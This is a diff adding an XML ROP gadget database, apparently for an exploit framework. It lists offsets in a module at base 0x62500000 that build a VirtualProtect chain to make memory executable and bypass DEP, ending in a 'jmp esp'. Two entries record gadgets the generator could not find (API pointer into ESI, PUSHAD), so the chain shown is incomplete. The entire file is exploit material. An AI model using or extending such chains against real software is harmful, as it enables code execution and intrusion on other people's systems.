@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>-1.0-</target>
+  </compatibility>
+
+  <gadgets base="0x62500000">
+    <gadget value="0x00000000">[-] Unable to find gadgets to pickup the desired API pointer into esi</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x000070c4">ptr to VirtualProtect() </gadget>
+    <gadget offset="0x000012e6">POP EBP # RETN </gadget>
+    <gadget offset="0x000012a3"> jmp esp </gadget>
+    <gadget offset="0x000012c0">POP EBX # RETN </gadget>
+    <gadget value="0x00000201">0x00000201-> ebx</gadget>
+    <gadget offset="0x000012cc">POP EDX # RETN </gadget>
+    <gadget value="0x00000040">0x00000040-> edx</gadget>
+    <gadget offset="0x000012f4">POP ECX # RETN </gadget>
+    <gadget offset="0x00005eee">Writable location </gadget>
+    <gadget offset="0x000019e4">POP EDI # RETN </gadget>
+    <gadget offset="0x0000116c">RETN (ROP NOP) </gadget>
+    <gadget offset="0x0000129c">POP EAX # RETN </gadget>
+    <gadget value="0x90909090">nop</gadget>
+    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>
+  </gadgets>
+</rop>
+</db>
